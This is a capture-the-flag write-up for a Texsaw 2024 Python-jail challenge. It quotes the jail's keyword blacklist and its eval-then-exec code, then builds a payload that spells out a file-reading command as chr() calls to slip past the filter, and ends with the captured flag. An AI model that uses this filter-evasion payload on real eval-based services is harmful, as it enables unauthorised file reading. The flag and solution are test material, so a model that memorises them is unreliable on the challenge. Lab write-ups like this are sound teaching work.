---
layout: writeup
category: Texsaw-CTF-2024
chall_description:
points: 200
solves: -1
tags: misc misc/pyjail
date: 2024-3-25
comments: false
---

You've been locked in the worst prison imaginable: one without any meatballs! To escape the prison, you must read the flag using Python!  

`nc 3.23.56.243 9011`  

---

After playing around with it a bit, and getting various errors, here's what I got:  

```
blacklist: import, dir, print, open, ', ", os, sys, _, eval, exec, =, [, ]

prohibited actions:
    function calls without parameters, i.e. '()'

code fragments:
    inp = eval(inp)
    inp = inp.replace("print", "stdout.write")
    out = exec(inp)
```

The code fragments are the most important here. Notably, the input is evaluated first before it is executed... let's test if a function like chr() works.  

Turns out, it does! That means we can just write every character as a chr(some number), which will allows us to print the file. Here's a little script that helps us write our payload:  

```py
payload = 'print(open("flag.txt","r").read())'
for i in payload:
    print(f'chr({ord(i)})+', end='')
```

And here's our final payload:  

```
chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(114)+chr(34)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(41)
```

    texsaw{SP4P3GGY_4ND_M34TBA11S_aa17c6d30ee3942d}